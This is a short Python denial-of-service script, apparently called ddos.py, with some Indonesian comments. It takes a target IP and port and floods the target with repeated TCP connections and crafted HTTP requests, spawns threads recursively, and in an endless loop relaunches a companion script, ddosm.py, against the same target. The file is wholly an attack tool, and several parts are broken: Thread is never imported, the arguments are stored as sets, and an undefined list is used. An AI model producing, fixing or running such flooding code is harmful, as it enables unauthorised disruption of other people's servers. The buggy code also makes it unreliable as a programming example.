import time
import socket
import random
from requests import get
from subprocess import Popen, PIPE
from threading import Timer
from random import randint
import os
import argparse
parser = argparse.ArgumentParser(description='usage : python3 ddos.py -vct <ip> -vpt <port>')

parser.add_argument('-vct', type=str, help='IP')
parser.add_argument('-vpt', type=str, help='PORT')

# Mendapatkan argumen dari baris perintah
args = parser.parse_args()

# Menggunakan argumen yang diberikan
try:
    if args.vct is not None and args.vpt is not None:
        a2 = {args.vct}
        a1 = {args.vpt}
    def main():
        server_ip = a2
        server_port = a1
        server_thread = Thread(target=saturate_server(server_ip, server_port))
        t = Timer(3, server_thread)
        try:
            server_thread.start()
            t.start()
        except KeyboardInterrupt:
            server_thread.join()
            t.cancel()
    def saturate_server(server_ip, server_port):
        while True:
            print("Sending Botnet...")
            s = socket.create_connection((server_ip, server_port), 2)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.send(b"GET /wget.txt HTTP/1.1\r\nHost: " + server_ip + "#wget.txt\r\nUser-Agent: Botnet\r\n\r\n")
            print(f"Sending Botnet To {server_ip}")
            # Close the socket to release the resources.
            s.close()
            thread_count = 20
            for i in range(thread_count):
                # Create a thread using the target function and parameters.
                thread = Thread(target=saturate_server, args=(server_ip, server_port))
                # Start the thread.
                thread.start()

                # Sleep for a bit so that the thread can finish before moving on.
                time.sleep(5)
            for t in threads:
                t.join()

                 # Display a success message when all threads have finished running before exiting.
    while True:
        r = '\033[1;91m'
        g = '\033[1;32m'
        b = '\033[1;34m'
        list_warna = r, g, b
        warna = random.choice(list_warna)
        print(warna + f"[ + ] Info = Botnet Just Sending Nuke To Servers [ + ]")
        attack_num = 20
        attack_num = attack_num + 5
        for i in range(attack_num):
            os.system(f'python3 ddosm.py -vct {a2} -vpt {a1}')
except NameError:
    print("usage : python3 ddos.py -vct <ip> -vpt <port>")